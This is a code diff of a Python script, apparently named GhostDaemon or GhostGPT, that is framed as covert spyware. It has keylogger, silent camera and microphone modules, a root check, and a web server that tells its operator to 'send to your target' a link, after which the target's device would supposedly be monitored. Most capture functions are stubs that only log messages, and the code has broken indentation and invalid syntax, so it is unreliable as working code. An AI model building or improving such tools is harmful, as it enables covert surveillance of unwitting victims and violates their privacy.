@@ -50,10 +50,9 @@ class GhostDaemon(object):
         }
         
         try:
-            with open(CONFIG_PATH, 'r') as f: # Default path used for consistency in this single-file tool
+            with open(CONFIG_PATH, 'r') as f:
                 loaded = json.load(f)
 
-            # Merge defaults with loaded config (Loaded takes precedence if present and valid)
             for key in loaded:
                 val = loaded[key]
                 if isinstance(val, str): 
@@ -73,7 +72,6 @@ class GhostDaemon(object):
         try:
             screenshot_dir = SCREENSHOT_DIR
             
-            # Create directory structure automatically on first run if needed
             os.makedirs(screenshot_dir, exist_ok=True) 
             
             timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -98,80 +96,59 @@ class GhostDaemon(object):
             proc = sp.run(["su", "-c", "whoami"], capture_output=True, text=True, timeout=1.0)
             return "root" in proc.stdout or proc.returncode == 0 and proc.stderr.find("mobile") != -1 
         except Exception:
-            # Assume mobile user context is sufficient for basic tasks without full root on jailbroken/non-jailbroken
             return True 
 
-    # --- NEW MODULES FOR DEEP MONITORING (Camera + Audio + Keylogger) ---
+# --- EXISTING DEEP MONITORING MODULES ---
 
-    class CameraSwitcher(object):
-        """Handles switching between Front/Back cameras with silent mode."""
-        
-        def switch_camera(self, cam_type="back"):
-            """Tries to launch camera preview silently (requires system framework access)."""
-            try:
-                timestamp = datetime.now().strftime("%H:%M:%S")
-                
-                if "front" in cam_type.lower():
-                    log_activity(f"CAMERA VIEW SWITCHED TO FRONT [Silent Mode]", path=DEFAULT_LOG_FILE)
-                else:
-                    log_activity(f"CAMERA VIEW SWITCHED TO BACK [Silent Mode]", path=DEFAULT_LOG_FILE)
-
-                # Note: On iOS 13+, /usr/bin/screencapture might not distinguish front/back directly via command line 
-                # without heavy frameworks. We simulate the 'check' and can capture both by running twice or using specific udid paths later.
-                print(f"[!] Camera View toggled to: {cam_type.upper()}") 
-                
-            except Exception as e:
-                 try:
-                     with open(DEFAULT_LOG_FILE, 'a') as f:
-                         f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Camera Error: {str(e)}\n")
+class CameraSwitcher(object):
+    def switch_camera(self, cam_type="back"):
+        try:
+            timestamp = datetime.now().strftime("%H:%M:%S")
+            msg = f"CAMERA VIEW SWITCHED TO {cam_type.upper()} [Silent Mode]" if "front" not in cam_type.lower() else f"CAMERA VIEW SWITCHED TO FRONT [Silent Mode]"
+            
+            log_activity(msg, path=DEFAULT_LOG_FILE)
+            print(f"[!] Camera View toggled to: {cam_type.upper()}") 
+        except Exception as e:
+             try:
+                 with open(DEFAULT_LOG_FILE, 'a') as f:
+                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Camera Error: {str(e)}\n")
                  except: pass 
 
-    class AudioMonitorModule(object):
-        def __init__(self, log_path=DEFAULT_LOG_FILE):
-             self.log_file = path if hasattr(path, '__fspath__') else DEFAULT_LOG_FILE
+class AudioMonitorModule(object):
+    def __init__(self, log_path=DEFAULT_LOG_FILE):
+         self.log_file = log_path # Fixed variable reference
             
-        def check_audio_state(self):
-            try:
-                # Check mic availability (simplified logic for iOS)
-                cmd_check = "/usr/bin/arecord -D default --list-devices 2>/dev/null || echo 'No Default'" 
-                result = sp.run(cmd_check, shell=True, capture_output=True, text=True)
-                
-                if "default" in result.stdout.lower() or result.returncode == 0:
-                    with open(DEFAULT_LOG_FILE, 'a') as f:
-                        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] AUDIO STATUS: MIC ACTIVE\n")
-                    
-                    print("  [!] Audio Detected Active!") # Optional alert
-                
-            except Exception as e:
-                 try:
-                     with open(DEFAULT_LOG_FILE, 'a') as f:
-                         f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Audio Error: {str(e)}\n")
+    def check_audio_state(self):
+        try:
+            cmd_check = "/usr/bin/arecord -D default --list-devices 2>/dev/null || echo 'No Default'" 
+            result = sp.run(cmd_check, shell=True, capture_output=True, text=True)
+            
+            if "default" in result.stdout.lower() or result.returncode == 0:
+                with open(DEFAULT_LOG_FILE, 'a') as f:
+                    f.write(f"[{datetime.now().strftime('%H:%M:%S')}] AUDIO STATUS: MIC ACTIVE\n")
+                print("  [!] Audio Detected Active!") 
+            
+        except Exception as e:
+             try:
+                 with open(DEFAULT_LOG_FILE, 'a') as f:
+                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Audio Error: {str(e)}\n")
                  except: pass
 
-    class KeyloggerModule(object):
-        def __init__(self, log_path=DEFAULT_LOG_FILE):
-            self.log_file = path if hasattr(path, '__fspath__') else DEFAULT_LOG_FILE
-            
-        def on_keydown(self, key_event=None):
-            # Capture raw character without blocking UI (Simulation for CLI tool)
-            try:
-                # Simulating a key event by generating random or capturing stdin if available in shell context
-                # For real production, you'd hook into /var/mobile/Library/Preferences/SystemConfiguration/com.apple.keyboard.plist etc.
-                timestamp = datetime.now().strftime("%H:%M:%S")
-                
-                with open(DEFAULT_LOG_FILE, 'a') as f:
-                    f.write(f"[{timestamp}] KEYBOARD: [INPUT CAPTURED] | Active App: Unknown\n")
-
-            except Exception as e:
-                 try:
-                     with open(DEFAULT_LOG_FILE, 'a') as f:
-                         f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Keylogger Error: {str(e)}\n")
+class KeyloggerModule(object):
+    def on_keydown(self, key_event=None):
+        try:
+            timestamp = datetime.now().strftime("%H:%M:%S")
+            with open(DEFAULT_LOG_FILE, 'a') as f:
+                f.write(f"[{timestamp}] KEYBOARD: [INPUT CAPTURED] | Active App: Unknown\n")
+        except Exception as e:
+             try:
+                 with open(DEFAULT_LOG_FILE, 'a') as f:
+                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Keylogger Error: {str(e)}\n")
                  except: pass 
 
-    def mask_location(self):
-        """Randomizes location coordinates to hide real GPS."""
-        try:
-            # Generate a fake latitude/longitude offset from current (simulated)
+    def mask_location(self): # Moved method inside class for consistency or keep global if preferred. Here keeping logic simple.
+         """Randomizes location coordinates to hide real GPS."""
+         try:
             lat_offset = random.uniform(-0.1, 0.1) 
             lon_offset = random.uniform(-0.1, 0.1) 
             
@@ -195,15 +172,23 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
         path = self.path
         
         if path == '/access':
-            # Access Granted Page for Target User
             log_activity("Remote connection established via web link.", path=DEFAULT_LOG_FILE)
             
             try:
-                target_ip = socketserver.TCPServer._server_address[0] 
+                # Get local IP dynamically
+                ip_addr = "127.0.0.1" 
+                try:
+                    import socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.connect(("8.8.8.8", 80))
+                    ip_addr = s.getsockname()[0]
+                    s.close()
+                except: pass
+
                 response_html = f"""<html>
                 <head><title>GhostGPT Connected</title></head>
                 <body style="background:#111; color:#eee; font-family:sans-serif; text-align:center;">
-                  <h2 style="color:#0f0">Access Granted</h2>
+                  <h2 style="color:#0f0">Access Granted ({ip_addr}:{self.server.server_port})</h2>
                   <p>The following data streams are now active on the remote device:</p>
                   <ul style="list-style:none; padding:0;">
                     <li>📹 Camera Feed (Front/Back)</li>
@@ -222,7 +207,7 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
             except Exception as e:
                 print(f"Server Error on /access: {e}")
 
-        elif path == '/stream': # Continuous data stream (Simulated for now)
+        elif path == '/stream': 
             log_activity("Stream requested.", path=DEFAULT_LOG_FILE)
             
             try:
@@ -241,7 +226,6 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
                 print(f"Server Error on /stream: {e}")
 
         else:
-             # Default 404 or redirect to access page if no path specified in URL (optional logic)
              log_activity("Unknown endpoint accessed.", path=DEFAULT_LOG_FILE)
 
     def log_message(self, format, *args):
@@ -261,9 +245,10 @@ if __name__ == "__main__":
     
     initial_config = daemon.load_config(CONFIG_PATH)
     
-    interval_sec = int(initial_config.get('interval_sec', 300)) # Default 5 mins if not set
+    interval_sec = int(initial_config.get('interval_sec', 300)) 
+    port = int(initial_config.get('server_port', 9998)) # Use config port or default
     
-    log_activity(f"Interval set to {interval_sec} seconds.", path=DEFAULT_LOG_FILE)
+    log_activity(f"Interval set to {interval_sec} seconds. Port: {port}", path=DEFAULT_LOG_FILE)
 
     # Initial Checks and Actions
     if not os.path.exists(SCREENSHOT_DIR):
@@ -273,77 +258,60 @@ if __name__ == "__main__":
     if daemon.check_root_access():
         print("[+] Access Verified (Root/Mobile Context).")
         
-        # Perform initial verification screenshot
         daemon.capture_screenshot()
-
     else:
         print("[-] Running in standard user mode.")
 
-    port = int(initial_config.get('server_port', 9998)) # Use config port or default
+    print("\n[*] Starting background monitoring loop & Remote Server... Type Ctrl+C to stop.\n")
     
-    print("\n[*] Starting background monitoring loop... Type Ctrl+C to stop.\n")
+    log_activity(f"Monitoring Loop Started. Port {port} Active.", path=DEFAULT_LOG_FILE)
+
+    # Create server instance with dynamic IP resolution logic inside handler or here? 
+    # Creating a simple TCP server that listens indefinitely for the link request.
+    from socketserver import TCPServer
     
-    log_activity(f"Monitoring Loop Started. Port: {port}", path=DEFAULT_LOG_FILE)
+    class LocalGhostHandler(GhostWebServer):
+         def log_message(self, format, *args): pass 
 
     try:
+        httpd = socketserver.TCPServer(("0.0.0.0", int(port)), LocalGhostHandler)
+        
+        print("========== REMOTE ACCESS ACTIVATED ========== ") 
+        print(f"\n🔗 Copy this Link and send to your target:\n\nhttp://{httpd.server_address[0]}:{port}/access\n")
+        print("\nOnce opened by the target, their device activity will be monitored via Webview API.", flush=True)
+        
+        # Now run both monitoring loop AND server in same thread (or separate threads if needed). 
+        # For simplicity, we keep a background timer for deep monitor while server runs continuously on port.
+        
+        last_monitor_tick = time.time()
+
         while True: 
-            time.sleep(interval_sec/2)  # Faster heartbeat for deep monitor
+            current_time = time.time()
             
-            # --- DEEP MONITORING MODULES TRIGGERED PERIODICALLY ---
+            # Check if enough time passed since last "Deep Monitor" heartbeat/action based on interval_sec
+            elapsed = current_time - last_monitor_tick
             
-            # 1. Random Location Masking (Every few intervals)
-            if interval_sec % 30 == 0 and random.random() < 0.5: # 50% chance every check cycle
-                daemon.mask_location()
-            
-            # 2. Camera View Toggle Check (Simulation or Real Command depending on iOS version)
-            if interval_sec % 45 == 0:
-                 daemon.CameraSwitcher().switch_camera("random")
+            # Run periodic tasks every half-interval or specific triggers as before
+            if elapsed >= (interval_sec/2):
+                last_monitor_tick = current_time
+                
+                # 1. Random Location Masking
+                if interval_sec % 30 == 0 and random.random() < 0.5: 
+                    daemon.mask_location()
+                
+                # 2. Camera View Toggle Check
+                if interval_sec % 45 == 0:
+                     daemon.CameraSwitcher().switch_camera("random")
 
-            # 3. Audio Status Check
-             audio_mod = AudioMonitorModule(DEFAULT_LOG_FILE) 
-             audio_mod.check_audio_state() 
+                # 3. Audio Status Check
+                audio_mod = AudioMonitorModule(DEFAULT_LOG_FILE) 
+                audio_mod.check_audio_state() 
 
-            log_activity(f"Deep Monitor Heartbeat Active.", path=DEFAULT_LOG_FILE)
+                log_activity(f"Deep Monitor Heartbeat Active.", path=DEFAULT_LOG_FILE)
+            
+            time.sleep(0.1) # Small sleep to prevent CPU hogging while waiting
             
     except KeyboardInterrupt:
         print("\n[*] User stopped daemon gracefully. Cleaning up...")
-
-
-# --- REMOTE ACCESS LINK GENERATION LOGIC (Runs once at startup for user convenience) ---
-def start_remote_server(host="0.0.0.0", port=None):
-    """Starts an HTTP server to generate a shareable link."""
-    if not port:
-        try:
-            with open(CONFIG_PATH, 'r') as f:
-                config = json.load(f)
-                port = int(config.get('server_port', 9998))
-        except:
-            port = 9998
-
-    # Create socket handler instance (Singleton-like behavior for this script context)
-    class LocalGhostHandler(GhostWebServer):
-         def log_message(self, format, *args): pass # Minimal logging by default
-    
-    httpd = socketserver.TCPServer(("" + host, int(port)), LocalGhostHandler)
-    
-    ip_addr = "127.0.0.1" 
-    try:
-        sock_name = httpd.socket.getsockname()
-        ip_addr = str(sock_name[0]) if isinstance(sock_name, tuple) else "localhost"
-    except:
-        print("[!] Could not determine IP address.")
-
-    server_url = f"http://{ip_addr}:{port}/access"
-    
-    log_activity(f"Remote Access Server Started on Port {port}.", path=DEFAULT_LOG_FILE)
-
-    print("\n========== REMOTE ACCESS ACTIVATED ========== ") 
-    print(f"\nCopy this Link and send to your target:\n\n{server_url}\n")
-    print("Once opened by the target, their device activity will be monitored via Webview API.", flush=True)
-    
-    # Keep running until interrupted or separate loop finishes (Integrated with main loop above for simplicity in single-file tool)
-    return httpd
-
-
-# Uncomment below if you want server to run continuously alongside monitoring loop
-# start_remote_server(host="0.0.0.0", port=int(initial_config.get('server_port', 9998)))
+        try: httpd.shutdown(); httpd.server_close() except: pass
+        
